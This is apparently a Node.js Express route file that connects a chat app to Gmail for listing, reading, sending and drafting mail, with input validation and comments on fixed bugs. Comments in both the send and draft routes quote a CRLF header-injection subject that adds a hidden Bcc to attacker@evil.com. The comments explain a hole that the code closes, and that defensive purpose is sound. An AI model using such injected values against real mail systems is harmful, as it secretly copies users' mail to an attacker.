/**
 * Gmail Integration Routes
 * 
 * Provides endpoints for browsing and reading Gmail messages
 * for use as chat attachments (read-only).
 * 
 * Uses the official `googleapis` SDK with per-user OAuth2 tokens.
 */

const express = require('express');
const log = require('../../telemetry/log');
const router = express.Router();
require('googleapis');
const { loadConfig, requireAuth } = require('../../auth/permissions');

/**
 * Create an authenticated Gmail client from session tokens.
 */
async function createGmailClient(req) {
    const { createGoogleApiClient } = require('../../integrations/googleClient');
    return createGoogleApiClient(req.session, {
        api: 'gmail', version: 'v1',
        notConnectedError: 'NOT_CONNECTED',
        notConfiguredError: 'Google OAuth not configured. Set up Google SSO in Admin → Security.',
    });
}

// Body/header parsing — shared home (services/email/parse). getGmailHeader
// additionally guards entries without a name (the old inline copy threw).
const { extractTextBody, getGmailHeader: getHeader } = require('../../services/email/parse');

// The RFC 2822 builder is shared with the tool/automation path so both send
// paths sanitise header values identically (no second copy to keep in sync).
const { buildRawMessage } = require('../../integrations/gmailTools');
const { validate } = require('../../core/http/validate');
const { z } = require('zod');

// ── What a caller may send ──────────────────────────────────────────
//
// /send and /draft take the approval card's draft, posted back verbatim, and
// then read exactly nine of its keys off `req.body`. A key that was not one
// of those nine was DROPPED, and the mail went out anyway on a 200 reading
// `{ success: true }`: a `bcc` misspelled `bbc`, or a `cc` the caller built
// as `Cc`, sent the message to everyone EXCEPT the copies that were asked
// for, with nothing in the answer to say a recipient had gone missing. The
// same silence covered `threadId`, whose absence turns a reply into a new
// conversation.
//
// `replyToMessageId` is in the schema and deliberately unread: the draft
// gmailTools builds carries it, so a strict schema has to accept it — the
// route threads on `threadId`.
//
// `to`/`subject`/`body` keep their old required check, but as a TYPED one:
// `!to` passed `to: 42`, which then reached sanitizeHeaderValue.
//
// On the read side, `pageSize` was `Math.min(parseInt(pageSize) || 20, 50)`,
// which has a ceiling but no floor: `?pageSize=-5` reached the Gmail API as
// `maxResults: -5`. The ceiling stays a clamp; the floor is a refusal. And
// `label = 'INBOX'` is a DESTRUCTURING default, which an empty string does
// not trigger: `?label=` left `labelIds` unset, so the picker asking for the
// INBOX was quietly answered with every label — Sent, Drafts, Archive and
// the rest. (Spam and Trash stay out either way: that needs the separate
// `includeSpamTrash`, which this route never sets.)

/** A string whose every refusal — including "you left it out" — is a sentence. */
const worded = (message) => z.string({ required_error: message, invalid_type_error: message });

const required = (name, what) => worded(`${name} is required — ${what}.`).trim().min(1, `${name} is required — ${what}.`);
const optionalText = (name) => worded(`${name} must be text.`).nullish();

const MessagesQuery = z.object({
    query: worded('query must be text.').optional(),
    pageToken: worded('pageToken must be text.').optional(),
    pageSize: z.coerce.number({ invalid_type_error: 'pageSize must be a number.' })
        .int('pageSize must be a whole number.')
        .min(1, 'pageSize must be at least 1.')
        .optional(),
    label: worded('label must be a Gmail label id.').min(1, 'label must be a Gmail label id.').optional(),
}).strict();

const MESSAGE_ID_TEXT = 'That is not a Gmail message id.';
const MessageParams = z.object({
    messageId: worded(MESSAGE_ID_TEXT).regex(/^[A-Za-z0-9_-]{1,128}$/, MESSAGE_ID_TEXT),
}).strict();

const EmailBody = z.object({
    to: required('to', 'who the message goes to'),
    subject: required('subject', 'what the message is about'),
    body: required('body', 'the message itself'),
    cc: optionalText('cc'),
    bcc: optionalText('bcc'),
    threadId: optionalText('threadId'),
    inReplyTo: optionalText('inReplyTo'),
    references: optionalText('references'),
    // Carried by the draft, read by nobody here — see the note above.
    replyToMessageId: optionalText('replyToMessageId'),
}).strict();

// ─── Status Check ────────────────────────────────────────────────

// requireAuth to match the other seven integration /status routes — this one
// and googleDrive's were the only two reachable anonymously, leaking whether
// Google SSO is configured on this installation.
router.get('/status', requireAuth, async (req, res) => {
    const isConnected = !!(req.session?.accessToken && req.session?.oauthProvider === 'google');
    const config = await loadConfig();
    const isConfigured = !!(config.providers?.google?.clientId && config.providers?.google?.clientSecret);

    res.json({
        connected: isConnected,
        configured: isConfigured,
        user: isConnected ? req.session.user : null,
    });
});

// ─── List / Search Messages ──────────────────────────────────────

router.get('/messages', validate({ query: MessagesQuery }), async (req, res, next) => {
    try {
        const gmail = await createGmailClient(req);
        const { query, pageToken, pageSize = 20, label = 'INBOX' } = req.query;

        // Build the Gmail search query
        let q = '';
        if (query) {
            q = query;
        }

        const response = await gmail.users.messages.list({
            userId: 'me',
            q: q || undefined,
            labelIds: label ? [label] : undefined,
            maxResults: Math.min(pageSize, 50),
            pageToken: pageToken || undefined,
        });

        const messageIds = response.data.messages || [];

        // Fetch metadata for each message (batch-style, parallel)
        const messages = await Promise.all(
            messageIds.map(async (msg) => {
                try {
                    const detail = await gmail.users.messages.get({
                        userId: 'me',
                        id: msg.id,
                        format: 'metadata',
                        metadataHeaders: ['From', 'To', 'Subject', 'Date'],
                    });

                    const headers = detail.data.payload?.headers || [];
                    return {
                        id: detail.data.id,
                        threadId: detail.data.threadId,
                        snippet: detail.data.snippet || '',
                        from: getHeader(headers, 'From'),
                        to: getHeader(headers, 'To'),
                        subject: getHeader(headers, 'Subject') || '(no subject)',
                        date: getHeader(headers, 'Date'),
                        labelIds: detail.data.labelIds || [],
                        isUnread: (detail.data.labelIds || []).includes('UNREAD'),
                    };
                } catch (err) {
                    log.error(`[Gmail] Failed to get message ${msg.id}:`, err.message);
                    return null;
                }
            })
        );

        res.json({
            messages: messages.filter(Boolean),
            nextPageToken: response.data.nextPageToken || null,
            resultSizeEstimate: response.data.resultSizeEstimate || 0,
        });
    } catch (err) {
        if (err.message === 'NOT_CONNECTED') {
            return res.status(401).json({ error: 'Not connected to Gmail', code: 'NOT_CONNECTED' });
        }
        log.error('[Gmail] List messages error:', err.message);
        next(err);
    }
});

// ─── Get Full Message Content ────────────────────────────────────

router.get('/messages/:messageId', validate({ params: MessageParams }), async (req, res, next) => {
    try {
        const gmail = await createGmailClient(req);
        const { messageId } = req.params;

        const detail = await gmail.users.messages.get({
            userId: 'me',
            id: messageId,
            format: 'full',
        });

        const headers = detail.data.payload?.headers || [];
        const body = extractTextBody(detail.data.payload);

        // Truncate very large emails
        const MAX_CHARS = 50000;
        const truncated = body.length > MAX_CHARS;
        const finalBody = truncated
            ? body.substring(0, MAX_CHARS) + '\n\n[... truncated, email too large ...]'
            : body;

        res.json({
            id: detail.data.id,
            threadId: detail.data.threadId,
            from: getHeader(headers, 'From'),
            to: getHeader(headers, 'To'),
            subject: getHeader(headers, 'Subject') || '(no subject)',
            date: getHeader(headers, 'Date'),
            body: finalBody,
            snippet: detail.data.snippet || '',
            truncated,
            charCount: body.length,
        });
    } catch (err) {
        if (err.message === 'NOT_CONNECTED') {
            return res.status(401).json({ error: 'Not connected to Gmail', code: 'NOT_CONNECTED' });
        }
        log.error('[Gmail] Get message error:', err.message);
        next(err);
    }
});

// ─── Send Email (User Approved) ──────────────────────────────────

router.post('/send', validate({ body: EmailBody }), async (req, res, next) => {
    try {
        const gmail = await createGmailClient(req);
        const { to, cc, bcc, subject, body, threadId, inReplyTo, references } = req.body;

        // Get the user's email for the From header
        const userEmail = req.session?.user?.email || '';

        // Shared with the automation path (integrations/gmailTools.js). This
        // used to be an inline copy of the same RFC 2822 builder, which meant
        // the interactive approval flow kept the CRLF header-injection hole
        // after the tool path was fixed: a subject of
        // "Invoice paid\r\nBcc: attacker@evil.com" became a real Bcc header
        // that Gmail honours, and the approval card renders the subject on one
        // line so the user never sees it. buildRawMessage sanitises every
        // header value and returns the base64url `raw` directly.
        const encodedMessage = buildRawMessage({ to, cc, bcc, subject, body, userEmail, inReplyTo, references });

        const sendParams = {
            userId: 'me',
            requestBody: {
                raw: encodedMessage,
            },
        };

        // Thread the reply if we have a threadId
        if (threadId) {
            sendParams.requestBody.threadId = threadId;
        }

        const result = await gmail.users.messages.send(sendParams);

        log.info(`[Gmail] Email sent successfully: ${result.data.id} to ${to}`);
        res.json({
            success: true,
            messageId: result.data.id,
            threadId: result.data.threadId,
        });
    } catch (err) {
        if (err.message === 'NOT_CONNECTED') {
            return res.status(401).json({ error: 'Not connected to Gmail', code: 'NOT_CONNECTED' });
        }
        log.error('[Gmail] Send email error:', err.message);
        next(err);
    }
});

// ─── Save as Gmail Draft ─────────────────────────────────────────

router.post('/draft', validate({ body: EmailBody }), async (req, res, next) => {
    try {
        const gmail = await createGmailClient(req);
        const { to, cc, bcc, subject, body, threadId, inReplyTo, references } = req.body;

        // Get the user's email for the From header
        const userEmail = req.session?.user?.email || '';

        // Shared with the automation path (integrations/gmailTools.js). This
        // used to be an inline copy of the same RFC 2822 builder, which meant
        // the interactive approval flow kept the CRLF header-injection hole
        // after the tool path was fixed: a subject of
        // "Invoice paid\r\nBcc: attacker@evil.com" became a real Bcc header
        // that Gmail honours, and the approval card renders the subject on one
        // line so the user never sees it. buildRawMessage sanitises every
        // header value and returns the base64url `raw` directly.
        const encodedMessage = buildRawMessage({ to, cc, bcc, subject, body, userEmail, inReplyTo, references });

        const draftParams = {
            userId: 'me',
            requestBody: {
                message: {
                    raw: encodedMessage,
                },
            },
        };

        // Thread the reply if we have a threadId
        if (threadId) {
            draftParams.requestBody.message.threadId = threadId;
        }

        const result = await gmail.users.drafts.create(draftParams);

        log.info(`[Gmail] Draft saved successfully: ${result.data.id} for ${to}`);
        res.json({
            success: true,
            draftId: result.data.id,
            messageId: result.data.message?.id,
            gmailLink: `https://mail.google.com/mail/u/0/#drafts?compose=${result.data.message?.id || result.data.id}`,
        });
    } catch (err) {
        if (err.message === 'NOT_CONNECTED') {
            return res.status(401).json({ error: 'Not connected to Gmail', code: 'NOT_CONNECTED' });
        }
        log.error('[Gmail] Save draft error:', err.message);
        next(err);
    }
});


module.exports = router;
